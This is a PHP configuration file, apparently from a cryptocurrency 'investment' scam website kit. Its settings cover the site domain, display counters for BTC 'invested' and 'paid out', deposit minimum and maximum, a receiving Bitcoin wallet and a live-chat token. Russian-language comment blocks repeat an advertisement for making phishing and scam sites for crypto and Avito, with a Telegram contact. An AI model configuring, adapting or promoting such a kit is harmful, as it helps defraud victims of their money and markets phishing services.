<?php
/*
× Копирование сайтов / Фишинг сайты / SCAM сайты - Криптовалют , Авито. / Помощь ×

╔📖 Предлагаю услуги:
╠▫️Подключаю платежные модули: Free-Kassa, Enot.io и т.д.
╠▫️Разрабатываю Telegram-ботов и любых других.
╠▫️Делаю качественно фишинг сайты.
╠▫️Настройка сайтов, подключение доменов.
╠▫️Установка сайтов.
╠▫️Исправляю ошибки.
╠▫️Вношу различные правки и улучшения.
╠▫️Визитки.
╠▫️Лендинги.
╠▫️Улучшение и доработка сайтов.
╚▫️Копирование сайтов.

Писать: @cryptobudlo
*/
		$site = "https://cb69231.tmweb.ru"; //Ваш домен

		$btc = "0"; //Сколько вложено BTC

		$payouts = "0"; //Сколько выплатили BTC

		$min = "0.005"; //Минимум столько BTC

		$max = "10"; //Максимум столько BTC

		$wallet = "1CZ7CBYprWsD3b3JPCctSWrAeYJNGANmCW"; //Кошелек BTC

		$smartsupp = "cd442f80f251ecb671f23705b9c6dc97ca278395"; //Токен от SmartSupp
/*
× Копирование сайтов / Фишинг сайты / SCAM сайты - Криптовалют , Авито. / Помощь ×

╔📖 Предлагаю услуги:
╠▫️Подключаю платежные модули: Free-Kassa, Enot.io и т.д.
╠▫️Разрабатываю Telegram-ботов и любых других.
╠▫️Делаю качественно фишинг сайты.
╠▫️Настройка сайтов, подключение доменов.
╠▫️Установка сайтов.
╠▫️Исправляю ошибки.
╠▫️Вношу различные правки и улучшения.
╠▫️Визитки.
╠▫️Лендинги.
╠▫️Улучшение и доработка сайтов.
╚▫️Копирование сайтов.

Писать: @cryptobudlo
*/
?>